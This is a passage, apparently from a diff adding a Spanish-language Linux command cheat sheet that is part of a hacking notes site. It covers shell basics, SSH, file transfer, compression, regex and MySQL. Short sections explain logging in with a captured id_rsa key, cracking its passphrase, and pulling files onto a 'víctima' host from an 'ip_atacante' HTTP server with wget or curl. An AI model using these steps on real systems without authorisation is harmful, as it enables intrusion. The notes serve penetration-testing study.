+</span></span><span style="display:flex;"><span>* nohup <span style="color:#f92672">[</span>comando<span style="color:#f92672">]</span> &amp; <span style="color:#f92672">(</span>ejecutar en 2º plano<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* <span style="color:#f92672">[</span>comando<span style="color:#f92672">]</span> &amp; disown <span style="color:#f92672">(</span>ejecutar en 2º plano, independiente del proceso padre<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="variables-bash-y-alias">
+  Variables Bash y alias
+  <a class="anchor" href="#variables-bash-y-alias">#</a>
+</h3>
+<ul>
+<li>$HOME</li>
+<li>$BASH</li>
+<li>$SHELL</li>
+<li>export $NAME=value (establece la variable de entorno al valor indicado)</li>
+<li>alias [alias]=[comando] (establecer un alias al comando)
+<!-- raw HTML omitted --><!-- raw HTML omitted --></li>
+</ul>
+<h3 id="concatenacion">
+  Concatenacion
+  <a class="anchor" href="#concatenacion">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* comando1 ; comando2 <span style="color:#f92672">(</span>ejecuta el primer comando, luego el segundo<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* comando1 <span style="color:#f92672">&amp;&amp;</span> comando2 <span style="color:#f92672">(</span>ejecuta el segundo, solo si el primero es exitoso<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* comando1 <span style="color:#f92672">||</span> comando2 <span style="color:#f92672">(</span>or, ejecuta el comando2 si el primero no es exitoso<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* comando1 | comando2 <span style="color:#f92672">(</span>envia la salida el primero, al segundo<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* comando1 |&amp; comando2 <span style="color:#f92672">(</span>envia erroes del comando1 al comando2<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="búsqueda">
+  Búsqueda
+  <a class="anchor" href="#b%c3%basqueda">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* grep <span style="color:#f92672">[</span>palabra<span style="color:#f92672">](</span>buscar lineas en fichero<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* find <span style="color:#f92672">(</span>buscar ficheros<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  * -name
+</span></span><span style="display:flex;"><span>* whereis <span style="color:#f92672">[</span>programa<span style="color:#f92672">](</span>encontrar binario<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* which <span style="color:#f92672">[</span>programa<span style="color:#f92672">](</span>como whereis<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* locate -i <span style="color:#f92672">[</span>directorio opcional<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>name<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>encontrar ficheros rapidamente<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* head <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>primeras <span style="color:#ae81ff">10</span> lineas fichero<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* tail <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">10</span> ultimas<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* awk <span style="color:#e6db74">&#39;[patron] {print $numero}&#39;</span> <span style="color:#f92672">[</span>fichero<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>buscar lineas que coinciden con patron<span style="color:#f92672">)</span>
+</span></span></code></pre></div><ul>
+<li>EJEMPLO mas útil: ps | awk -F &ldquo;:&rdquo; &lsquo;{print $2}&rsquo; (muestra la segunda columna del resultado del comando <code>ps</code> cuyo delimitador sea &lsquo;:&rsquo;)</li>
+</ul>
+<h3 id="compresion-ficheros">
+  Compresion ficheros
+  <a class="anchor" href="#compresion-ficheros">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* tar -cf <span style="color:#f92672">[</span>file.tar<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>file<span style="color:#f92672">](</span>comprimir<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* tar -xf <span style="color:#f92672">[</span>file.tar <span style="color:#f92672">](</span>descomprimir<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="conexion-ssh">
+  conexion SSH
+  <a class="anchor" href="#conexion-ssh">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* ssh user@host
+</span></span><span style="display:flex;"><span>* ssh -p user@host <span style="color:#f92672">(</span>indicar puerto<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="conexion-ssh-con-id_rsa">
+  Conexion SSH con id_rsa
+  <a class="anchor" href="#conexion-ssh-con-id_rsa">#</a>
+</h4>
+<p>Teniendo el fichero id_rsa del usuario podemos realizar una conexión. En ocasiones no necesitamos contraseña. En caso de que sí, se puede intentar crackear con <a href="4%20-%20Hacking%20gen%c3%a9rico/Ataques%20fuerza%20bruta.md">Ataques fuerza bruta</a><br>
+Importante CAMBIAR LOS PEEMISOS A 600</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span><span style="display:flex;"><span>ssh &lt;usuario&gt;@&lt;ip&gt; -i id_rsa
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h4 id="copiar-ficheros-con-ssh-por-scp">
+  Copiar ficheros con SSH por SCP
+  <a class="anchor" href="#copiar-ficheros-con-ssh-por-scp">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp &lt;origen&gt; &lt;destino&gt;
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;SUBIR FICHEROS&#34;</span> scp /home/kali/file.txt usuario@servidor:/ruta
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;DESCARGAR FICHEROS&#34;</span> scp usuario@servidor:/file.txt /home/kali.file.txt
+</span></span></code></pre></div><h3 id="networking">
+  Networking
+  <a class="anchor" href="#networking">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>* ip addr show <span style="color:#f92672">(</span>ver ip<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* ifconfig <span style="color:#f92672">(</span>ver todas las interfaces<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* netstat <span style="color:#f92672">(</span>ver puertos a la escucha<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* wget <span style="color:#f92672">[</span>url<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>descargar fichero desde url<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>* curl -O <span style="color:#f92672">(</span>igual que wget<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h3 id="compartir-ficheros-entre-maquinas">
+  Compartir ficheros entre maquinas
+  <a class="anchor" href="#compartir-ficheros-entre-maquinas">#</a>
+</h3>
+<p>Podemos compartir ficheros con la máquina víctima montando un servidor http en python. Para ello nos posicionamos en la ruta donde tengamos el fichero y ejecutamos</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">5000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>El puerto <span style="color:#ae81ff">80</span> en ocasiones requiere permisos de root
+</span></span></code></pre></div><p>desde la máquina víctima hacemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget &lt;http://ip_atacante/recurso&gt;
+</span></span></code></pre></div><p>otra opción sería</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl &lt;http://ip_atacante/recurso&gt; -o recurso
+</span></span></code></pre></div><h3 id="ftp">
+  FTP
+  <a class="anchor" href="#ftp">#</a>
+</h3>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp &lt;ip&gt;
+</span></span><span style="display:flex;"><span>ftp user@ip
+</span></span><span style="display:flex;"><span>get &lt;fichero&gt;
+</span></span><span style="display:flex;"><span>mget *
+</span></span><span style="display:flex;"><span>put &lt;fichero&gt;
+</span></span></code></pre></div><h3 id="compresiondescompresion-de-ficheros">
+  Compresion/Descompresion de ficheros
+  <a class="anchor" href="#compresiondescompresion-de-ficheros">#</a>
+</h3>
+<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<h4 id="tar">
+  TAR
+  <a class="anchor" href="#tar">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tar -xf fichero.tar <span style="color:#e6db74">&#34;DESCOMPRIMIR&#34;</span>
+</span></span><span style="display:flex;"><span>tar -xzf archivo.tar.gz <span style="color:#e6db74">&#34;DESCOMPRIMIR tar.gz&#34;</span>
+</span></span><span style="display:flex;"><span>tar -cf fichero.tar fichero_a_comprimir.txt <span style="color:#e6db74">&#34;COMPRIMIR&#34;</span>
+</span></span><span style="display:flex;"><span>tar -cf fichero.tar fichero_a_comprimir1.txt fichero_a_comprimir2.txt <span style="color:#e6db74">&#34;COMPRIMIR VARIOS&#34;</span>
+</span></span></code></pre></div><h4 id="gzip">
+  GZIP
+  <a class="anchor" href="#gzip">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gzip -c documento.txt &gt; comprimido.gz <span style="color:#e6db74">&#34;COMPRIMIR&#34;</span>
+</span></span><span style="display:flex;"><span>gzip -d documento.gz <span style="color:#e6db74">&#34;DESCOMPRIMIR&#34;</span>
+</span></span><span style="display:flex;"><span>gunzip documento.gz <span style="color:#e6db74">&#34;DESCOMPRIMIR&#34;</span>
+</span></span></code></pre></div><h3 id="regex-expresiones-regulares">
+  Regex (Expresiones regulares)
+  <a class="anchor" href="#regex-expresiones-regulares">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#Sustitución de caracteres</span>
+</span></span><span style="display:flex;"><span>tr <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74"> &#39;</span> <span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Eliminacion caracteres</span>
+</span></span><span style="display:flex;"><span>tr <span style="color:#f92672">-</span>d <span style="color:#e6db74">&#39; &#39;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Seleccion de culumnas</span>
+</span></span><span style="display:flex;"><span>EJ: imprimir columna <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>awk <span style="color:#e6db74">&#39;{print $2}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Mostrar lineas distintas de</span>
+</span></span><span style="display:flex;"><span>grep <span style="color:#f92672">-</span>v <span style="color:#f92672">&lt;</span>palabra<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#No distinguir mayusculas de minusculas</span>
+</span></span><span style="display:flex;"><span>grep <span style="color:#f92672">-</span>i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Encontrar palabra en conjunto de archivos</span>
+</span></span><span style="display:flex;"><span>grep <span style="color:#f92672">-</span>l <span style="color:#f92672">&lt;</span>palabra<span style="color:#f92672">&gt;</span> <span style="color:#f92672">./*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Invertir lineas en un fichero</span>
+</span></span><span style="display:flex;"><span>tac <span style="color:#f92672">&lt;</span>fichero_original<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#f92672">&lt;</span>fichero_destino<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tratamiento con sed (p.e eliminar la ultima coma de una linea)</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#EXPLICACION: &#34;s&#34; es pra sustitución</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># ,$ hace referencia a la ultima coma</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># \n hace referencia a un salto de linea</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># hay que separar los argumentos con una &#34;/&#34; SIEMPRE</span>
+</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/,$/</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">/&#39;</span>
+</span></span></code></pre></div><h3 id="sql">
+  SQL
+  <a class="anchor" href="#sql">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Conexion a base de datos MYSQL, ojo a como está la contraseña, no es un error. la clave va pegada al -p.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mysql -h &lt;ip&gt; -u &lt;usuario&gt; -p&lt;contraseña&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ver bases de datos</span>
+</span></span><span style="display:flex;"><span>show databases;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># utilizar una base de datos</span>
+</span></span><span style="display:flex;"><span>use &lt;bbdd&gt;;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ver tablas de una base de datos</span>
+</span></span><span style="display:flex;"><span>show tables;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sentencias SQL básicas</span>
+</span></span><span style="display:flex;"><span>SELECT &lt;columna/s&gt; FROM &lt;tabla&gt;;
+</span></span><span style="display:flex;"><span>SELECT &lt;columna/s&gt; FROM &lt;tabla&gt; WHERE id<span style="color:#f92672">=</span>1;
+</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#indice">Indice</a></li>
+        <li><a href="#recolectar-información">Recolectar información</a></li>
+        <li><a href="#usuarios-y-grupos">usuarios y grupos</a></li>
+        <li><a href="#ficheros">Ficheros</a></li>
+        <li><a href="#permisos-en-ficheros">Permisos en ficheros</a></li>
+        <li><a href="#stdin--stdout--stdr">Stdin | Stdout | Stdr</a></li>
+        <li><a href="#variables-bash-y-alias">Variables Bash y alias</a></li>
+        <li><a href="#concatenacion">Concatenacion</a></li>
+        <li><a href="#búsqueda">Búsqueda</a></li>
+        <li><a href="#compresion-ficheros">Compresion ficheros</a></li>
+        <li><a href="#conexion-ssh">conexion SSH</a></li>
+        <li><a href="#networking">Networking</a></li>
+        <li><a href="#compartir-ficheros-entre-maquinas">Compartir ficheros entre maquinas</a></li>
+        <li><a href="#ftp">FTP</a></li>
+        <li><a href="#compresiondescompresion-de-ficheros">Compresion/Descompresion de ficheros</a></li>
+        <li><a href="#regex-expresiones-regulares">Regex (Expresiones regulares)</a></li>
+        <li><a href="#sql">SQL</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
